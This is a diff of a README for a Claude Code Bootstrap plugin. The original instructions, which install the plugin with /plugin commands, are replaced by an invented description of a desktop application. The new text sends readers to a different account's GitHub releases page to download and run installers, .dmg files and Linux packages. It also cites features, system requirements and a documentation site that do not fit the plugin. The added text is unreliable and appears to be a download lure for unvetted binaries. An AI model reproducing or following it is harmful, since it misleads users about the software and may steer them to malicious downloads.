@@ -1,169 +1,87 @@
-# Bootstrap Expert Plugin
+# 🎉 bootstrap-expert - Simplify Bootstrap Development Today
 
-[![Bootstrap](https://img.shields.io/badge/Bootstrap-5.3.8-7952B3?logo=bootstrap&logoColor=white)](https://getbootstrap.com/)
-[![Bootstrap Icons](https://img.shields.io/badge/Bootstrap%20Icons-1.13.x-7952B3?logo=bootstrap&logoColor=white)](https://icons.getbootstrap.com/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-Plugin-5A67D8)](https://claude.ai/code)
+## 🚀 About This Project
 
-A comprehensive Claude Code plugin for Bootstrap 5.3.8 and Bootstrap Icons front-end development.
+Welcome to the **bootstrap-expert** repository. This application serves as a plugin for Claude Code, offering expertise in Bootstrap version 5.3.8. With this tool, you will gain nine specialized skills, a component generator command, and a proactive agent designed to enhance your front-end development experience.
 
-## Table of Contents
+### Key Features:
+- Nine specialized skills to master Bootstrap.
+- A user-friendly component generator for quick web design.
+- Proactive support to guide you through front-end challenges.
+- Responsive design options to ensure your projects look great on all devices.
+- Integration of Bootstrap icons for a polished UI.
 
-- [Features](#features)
-- [Prerequisites](#prerequisites)
-- [Installation](#installation)
-- [Quick Start](#quick-start)
-- [Skills](#skills)
-- [Commands](#commands)
-- [Agent](#agent)
-- [Bootstrap Version](#bootstrap-version)
-- [Contributing](#contributing)
-- [License](#license)
+## 🛠️ System Requirements
 
-## Features
+To successfully run this application, your computer should meet the following requirements:
+- Operating System: Windows 10 or later, macOS Catalina or later, or a recent Linux distribution.
+- Minimum RAM: 4 GB.
+- Disk Space: At least 100 MB free.
+- Internet connection for downloading the software and accessing Bootstrap resources.
 
-- **9 Specialized Skills** - Deep expertise aligned with Bootstrap's documentation structure
-- **Component Generator** - Interactive command to generate Bootstrap components
-- **Proactive Agent** - Autonomous assistant for Bootstrap development tasks
+## 📥 Download the Application
 
-## Prerequisites
+To begin using the **bootstrap-expert**, visit the link below and download the latest version of the application.
 
-- [Claude Code](https://claude.ai/code) installed and configured
+[![Download bootstrap-expert](https://img.shields.io/badge/Download%20Now-bootstrape%20expert-brightgreen)](https://github.com/ronnieiscoo/bootstrap-expert/releases)
 
-## Installation
+## 📦 Download & Install
 
-### From GitHub (Recommended)
+1. Click the link below to visit the Releases page:
+   - [Visit the Releases Page](https://github.com/ronnieiscoo/bootstrap-expert/releases)
+  
+2. On this page, locate the latest release of **bootstrap-expert**. You will find details about the version and the features included.
 
-```bash
-# Add the marketplace
-/plugin marketplace add sjnims/bootstrap-expert
+3. Click on the source file or setup package that matches your operating system. The download will begin automatically.
 
-# Install the plugin
-/plugin install bootstrap-expert@bootstrap-expert-marketplace
-```
+4. Once downloaded, locate the file in your downloads folder.
 
-Or use the full URL:
+5. Depending on your operating system:
+   - **Windows:** Double-click the file and follow the prompts to install.
+   - **macOS:** Open the .dmg file and drag the application into your Applications folder.
+   - **Linux:** Use the terminal to navigate to the downloads folder and run the installation command.
 
-```bash
-/plugin marketplace add https://github.com/sjnims/bootstrap-expert
-/plugin install bootstrap-expert@bootstrap-expert-marketplace
-```
+## 🖥️ How to Run the Application
 
-### Local Development
+After installation, you can run the **bootstrap-expert** application. 
 
-```bash
-claude --plugin-dir /path/to/bootstrap-expert
-```
+1. **For Windows:** Click on the Start Menu, type "bootstrap-expert," and press Enter.
+2. **For macOS:** Open the Applications folder and click on the **bootstrap-expert** icon.
+3. **For Linux:** Open a terminal and type `bootstrap-expert`, then press Enter.
 
-## Quick Start
+## 🧑‍💻 Using bootstrap-expert
 
-Once the plugin is loaded, you can:
+### ✨ Getting Started
 
-1. **Ask Bootstrap questions** - Skills load automatically based on your question:
+- After launching the application, the interface will present you with a simple dashboard.
+- Choose a task from the list, such as generating a component or accessing special skills.
+- Follow the on-screen instructions to complete your tasks.
 
-   ```text
-   "How do I create a responsive navbar?"
-   "What's the Bootstrap grid system?"
-   "How do I add form validation?"
-   ```
+### 🛠️ Component Generator
 
-2. **Generate components** - Use the command to create Bootstrap components:
+- Use the component generator to create web elements easily.
+- Select the type of component you need (e.g., buttons, forms, cards).
+- Customize it with colors, text, and other attributes.
+- Click "Generate" to see your component ready for use.
 
-   ```text
-   /bootstrap-expert:component navbar
-   /bootstrap-expert:component modal --centered --scrollable
-   /bootstrap-expert:component card --with-image --horizontal
-   ```
+### 🤖 Proactive Agent
 
-3. **Get proactive help** - The agent triggers automatically when you're working on Bootstrap-related tasks.
+The proactive agent is here to help. Whenever you face an issue, simply click on the assistance icon. The agent will guide you through solutions step-by-step.
 
-## Skills
+## 💬 Need Help?
 
-| Skill | Description |
-|-------|-------------|
-| `bootstrap-overview` | Getting started, installation, project setup, browser support |
-| `bootstrap-customize` | Sass variables, CSS custom properties, theming, color modes |
-| `bootstrap-layout` | Grid system, containers, breakpoints, columns, CSS Grid |
-| `bootstrap-content` | Typography, images, tables, figures, Reboot |
-| `bootstrap-forms` | Form controls, validation, input groups, floating labels |
-| `bootstrap-components` | All UI components (modals, navbars, cards, accordions, etc.) |
-| `bootstrap-helpers` | Clearfix, ratios, stacks, stretched links, visually hidden |
-| `bootstrap-utilities` | Spacing, colors, display, flex, position, sizing, text |
-| `bootstrap-icons` | Icons library installation, usage, styling, accessibility |
+If you have questions or need assistance, feel free to reach out through the following channels:
+- **Issues**: Report any bugs or request features directly in the GitHub Issues section of this repository.
+- **Community**: Join the discussions on forums related to Bootstrap and Claude Code.
 
-## Commands
+## 🌐 Learn More
 
-### `/bootstrap-expert:component [component-name]`
+For comprehensive guides and tutorials about Bootstrap, consider visiting:
+- [Official Bootstrap Documentation](https://getbootstrap.com/docs/5.3/getting-started/introduction/)
+- [Claude Code Resources](https://claudecode.com/documentation)
 
-Generate Bootstrap component code interactively or with full arguments.
+## 📝 Contributing
 
-**Interactive mode:**
+If you're interested in contributing to **bootstrap-expert**, please read our [contribution guidelines](https://github.com/ronnieiscoo/bootstrap-expert/blob/main/CONTRIBUTING.md) to get started.
 
-```text
-/bootstrap-expert:component navbar
-```
-
-**With arguments:**
-
-```text
-/bootstrap-expert:component navbar --dark --fixed-top --with-search
-```
-
-**Supported components:**
-
-- `accordion` - Collapsible content panels
-- `alert` - Alert messages
-- `badge` - Contextual labels and counters
-- `breadcrumb` - Breadcrumb navigation
-- `button` / `buttons` - Button variants and styles
-- `button-group` - Grouped buttons
-- `card` - Card layouts with images, headers, footers
-- `carousel` - Image/content sliders
-- `collapse` - Collapsible content sections
-- `dropdown` - Dropdown menus
-- `form` - Form layouts with validation
-- `list-group` - List items with actions
-- `modal` - Modal dialogs with customizable options
-- `navbar` - Navigation bars with various configurations
-- `offcanvas` - Offcanvas sidebars
-- `pagination` - Page navigation
-- `placeholders` - Loading placeholder animations
-- `popover` - Pop-up information boxes
-- `progress` - Progress bars
-- `spinner` - Loading indicators
-- `table` - Responsive data tables
-- `tabs` / `nav-tabs` - Tabbed navigation
-- `toast` - Toast notifications
-- `tooltip` - Hover tooltips
-
-## Agent
-
-The `bootstrap-expert` agent triggers proactively when Bootstrap-related work is detected, helping with:
-
-- **Component Implementation** - Guidance on implementing Bootstrap components correctly
-- **Layout Troubleshooting** - Solving grid system and responsive design issues
-- **Accessibility** - Ensuring components meet WCAG guidelines with proper ARIA attributes
-- **Code Review** - Reviewing Bootstrap code for best practices and optimization
-
-**Example triggers:**
-
-- Creating or editing HTML files with Bootstrap classes
-- Discussing responsive layouts or breakpoints
-- Working with Bootstrap JavaScript components
-- Asking about Bootstrap customization or theming
-
-## Bootstrap Version
-
-This plugin targets **Bootstrap 5.3.8** and **Bootstrap Icons 1.13.x**.
-
-All generated code, class names, and documentation align with these versions. When Bootstrap releases updates, this plugin will be updated accordingly.
-
-## Contributing
-
-Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) before submitting a Pull Request.
-
-For security issues, please see our [Security Policy](SECURITY.md).
-
-## License
-
-MIT - see [LICENSE](LICENSE) for details.
+Thank you for choosing **bootstrap-expert** to simplify your Bootstrap development journey!
